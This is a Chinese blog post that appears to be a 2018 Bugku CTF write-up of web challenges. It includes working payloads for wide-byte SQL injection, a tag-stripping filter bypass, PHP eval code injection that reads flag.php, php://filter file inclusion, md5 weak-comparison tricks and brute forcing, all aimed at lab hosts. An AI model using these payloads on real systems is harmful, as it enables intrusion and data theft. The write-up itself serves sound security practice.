<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>bugku writeup(杂项、Web） | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/style.css?v=1.3.1">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	false,
            lv: JSON.parse('{"enable":true,"app_id":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","app_key":"twfcGffxeJ6Bfm4fpJUQ256M","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","appkey":"twfcGffxeJ6Bfm4fpJUQ256M","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":"c1ada43c"}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.1"></script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname"></h5>
          <a href="mailto:1196821466@qq.com" title="1196821466@qq.com" class="mail">
            
              <span>1</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>6</span>
            
              <span>8</span>
            
              <span>2</span>
            
              <span>1</span>
            
              <span>4</span>
            
              <span>6</span>
            
              <span>6</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                文章分类
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                文章总览
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                关于
              </a>
            </li>
        
            <li class="">
              <a href="/links"  >
                <i class="icon icon-lg icon-plus-square"></i>
                友链
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>bugku writeup(杂项、Web）</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">bugku writeup(杂项、Web）</h1>
        <h5 class="subtitle">
            
                <time datetime="2018-06-06T08:10:51.000Z" itemprop="datePublished" class="page-time">
  2018-06-06
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-bugku"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">bugku writeup(杂项、Web）</h1>
        <div class="post-meta">
            <time class="post-time" title="2018-06-06 16:10:51" datetime="2018-06-06T08:10:51.000Z"  itemprop="datePublished">2018-06-06</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>



            
	<span id="/2018/06/06/bugku/" class="leancloud_visitors" data-flag-title="bugku writeup(杂项、Web）" title="bugku writeup(杂项、Web）">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2018/06/06/bugku/#comment">
            <span class="valine-comment-count" data-xid="/2018/06/06/bugku/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>滑稽，F12查看源，得到flag：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/96118525.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>题目提示：<br>请上传PHP文件，文件上传大小不允许超过1M<br>试了几次之后，当上传php文件时提示非图片文件，<br>上传图片时，提示非php文件，打开burpsuite，<br>将一个php文件的后缀加上.jpg，上传时将.jpg删掉再上传即可<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/21608635.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>题目给出的输入框限制了最大输入长度，<br>F12将最大长度限制删掉就行.<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/23490301.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>这题有基础的都知道怎么做：<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[&apos;what&apos;];</span><br><span class="line">echo $what;</span><br><span class="line">if($what==&apos;flag&apos;)</span><br><span class="line">echo &apos;flag&#123;****&#125;&apos;;</span><br></pre></td></tr></table></figure></p>
<p>将what提交了就行<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/28633444.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>跟上题一样:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/79911845.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码意思是当num不是个数字并且值等于1的时候输出flag：<br>payload:<code>URL?num=1x31</code><br>提交拿到flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>打开的时候阻止页面创建对话框<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16696183.jpg" alt="" title="" class="">
                <p></p>
            </figure><br>查看源码，<br>在最底下有串代码<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/31661363.jpg" alt="" title="" class="">
                <p></p>
            </figure><br>html码得到flag<br>附上<a href="http://www.convertstring.com/zh_CN/EncodeDecode/HtmlDecode" target="_blank" rel="noopener">解码连接</a><br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/50555689.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这题是宽字节注入：<br>原理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GBK 占用两字节</span><br><span class="line">ASCII占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），</span><br><span class="line">MYSQL默认字符集是GBK等宽字节字符集。</span><br><span class="line">大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，</span><br><span class="line">变成了 %df\’，其中\的十六进制是 %5C ，</span><br><span class="line">那么现在 %df\’ =%df%5c%27，</span><br><span class="line">如果程序的默认字符集是GBK等宽字节字符集，</span><br><span class="line">则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，</span><br><span class="line">也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p>
<p>首先，在url栏输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27</span><br></pre></td></tr></table></figure></p>
<p>报错了,说明可以注入<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/35293242.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>继续查看可显字段和库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23</span><br></pre></td></tr></table></figure></p>
<p>告诉你查询key表里id=1的字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>hint：<br><code>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag</code><br>直接改host就行，这里用火狐一个插件直接改访问的host就行<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/24899388.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>直接拿到flag</p>
<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>过滤代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//过滤sql</span><br><span class="line">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">	if (substr_count($id, $value) &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		exit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//xss过滤</span><br><span class="line">$id = strip_tags($id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br></pre></td></tr></table></figure></p>
<p>注入的关键词几乎都过滤了，但是看到后面有个xss过滤。<br>查资料发现strip_tags（）函数会去除字符串里的html和php标签，<br>思路是先在payload里插入html标签绕过sql的过滤，<br>然后再用xss的过滤去除html的标签：</p>
<p>想通之后很简单，就是常规的sql注入,<br>得到数据库名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23</span><br></pre></td></tr></table></figure></p>
<p>查找表为key的数据表，id=1值hash字段值，得到flag</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题是不停的刷新页面，用burpsuite抓包就行：<br>多go几次就能拿到flag：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/8440547.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>括号闭合的思路，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure></p>
<p>在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//<br>得到flag：<br>flag{bug-ctf-gg-99}</p>
<p>反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost sh]# echo The date is `date` </span><br><span class="line">The date is 2011年 03月 14日 星期一 21:15:43 CST</span><br></pre></td></tr></table></figure></p>
<p>单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。<br>单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。<br>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost tmp]# echo ‘the date is `date`’ </span><br><span class="line">the date is `date` </span><br><span class="line">[root@localhost tmp]# echo “the date is `date`” </span><br><span class="line">the date is Fri Oct 9 00:11:56 CST 2015</span><br></pre></td></tr></table></figure></p>
<p>eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！<br>然后用cat读取输出即可！</p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>某春秋原题。<br>flag In the variable !<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure></p>
<p><a href="http://blog.csdn.net/qq_35078631/article/details/62438259" target="_blank" rel="noopener">参考资料</a></p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>jsfuck<br>右键查看源代码：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/20293186.jpg" alt="" title="" class="">
                <p></p>
            </figure><br>复制下来，F12放到控制台回车，得到flag：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/1983962.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>看这个名字就感觉flag在响应头里：<br>F12查看一下响应头，得到flag<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/80220355.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>首先题目没有给什么提示，也没有<code>.bak`</code>robots<code>等东西，所以直接上御剑扫描，
然后扫到了一个</code>shell.php<code>，进去发现是一个大马，但是没有地方给密码，试了几个密码不行之后发现不行，没有验证码，直接爆破，出来之后发现密码是</code>hack`，直接得到flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>题目提示查看源代码，<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/16462625.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>进行了URL编码，<br>p1解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b</span><br></pre></td></tr></table></figure></p>
<p>p2解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b</span><br></pre></td></tr></table></figure></p>
<p>大概意思就是提交的值与<br>p1里面那段值加上<code>54aa2</code>再加上p2里的值相同就行<br>拼接起来提交就行：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/48961816.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>点进去，看看URL<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/98855012.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>一个文件包含的题，直接拿php伪协议试：<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>base64解码之后得到flag：<br>flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>输入5位数密码，直接爆破<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/41498063.jpg" alt="" title="" class="">
                <p></p>
            </figure><br>得到flag</p>
<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>查看源代码:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-6/38810373.jpg" alt="" title="" class="">
                <p></p>
            </figure><br>当clicks大于1000000时，能拿到flag<br>F12控制台输入clicks=100000000000回车即可得到flag</p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>备份文件获取，将<code>index.php.bak</code>下载下来，<br>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);</span><br><span class="line">$str = substr($str,1);</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>php弱类型比较，在url栏输入：</p>
<p><code>URL?key1=QNKCDZO&amp;key2=240610708</code></p>
<p>发现没啥反应，然后看了看源码，发现过滤了<code>key</code><br>双写key绕过，提交得到flag<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure></p>
<h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>直接访问：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/12155851.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>很明显是算不到这么快的。<br>只能写脚本了。<br>附上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://120.24.86.145:8002/qiumingshan/&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;&apos;value&apos;: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure></p>
<p>这里有个正则匹配来匹配给出的表达式，<br>然后直接用eval计算。<br>最后将<code>value</code> <code>post</code>即可得到flag，<br>但是计算出的表达式长度不一样，可能会超过php的最大长度<br>所以需要多试几遍。<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/19420139.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开来什么都没有，就是一个你得快点：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/86374868.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span><br></pre></td></tr></table></figure></p>
<p>有一段提示，<code>post</code> <code>margin</code>变量what i find<br>打开bp抓包：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/87281166.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>响应头中有个flag,<br>base64之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跑的还不错，给你flag吧: NjM4NzUy</span><br></pre></td></tr></table></figure></p>
<p>估计是把 <code>NjM4NzUy</code>提交上去就行了,<br>但是后面发现还得把<code>NjM4NzUy</code>解一次base64：<code>638752</code><br>这个后面再说原因。<br>直接上python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line">a=requests.session()</span><br><span class="line">r=a.get(url)</span><br><span class="line">FLAG=r.headers[&apos;flag&apos;]</span><br><span class="line">p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))</span><br><span class="line">payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;</span><br><span class="line">r=a.post(url,data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
<p>得到flag:<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-14/21828555.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>这里可以看到我的脚本用了两次base64，<br>如果只用一次的话，题目会提示<code>你需要再快点</code>，具体的这里就不试了<br>同时给出php的脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &quot;http://120.24.86.145:8002/web6/&quot;;</span><br><span class="line">    $contents = file_get_contents($url);</span><br><span class="line">    $header_arr = get_headers($url);</span><br><span class="line">    $cookie = $header_arr[5];</span><br><span class="line">    $cookie = explode(&apos;:&apos;,$cookie)[1];</span><br><span class="line">    $cookie = explode(&apos;;&apos;,$cookie)[0];</span><br><span class="line"></span><br><span class="line">    $flag = $header_arr[9];</span><br><span class="line">    $flag = explode(&apos;:&apos;,$flag)[1];</span><br><span class="line"></span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line">    $flag = explode(&apos;: &apos;,$flag)[1];</span><br><span class="line">    $flag = base64_decode($flag);</span><br><span class="line"></span><br><span class="line">    $post_data = array(&quot;margin&quot;=&gt;$flag);</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">    curl_setopt($ch,CURLOPT_COOKIE,$cookie);</span><br><span class="line">    curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"> </span><br><span class="line">    print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>打开题目看到一堆乱码，<br>但是URL栏看到那个<code>filename</code>，估计是个base64，<br>解码之后果然：<br><figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/35684580.jpg" alt="" title="" class="">
                <p></p>
            </figure></p>
<p>但是前面还有个参数<code>line</code>，行的意思，一开始不知道这个参数有什么用，<br>多试了几次：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-6-16/55573167.jpg" alt="" title="" class="">
                <p></p>
            </figure>
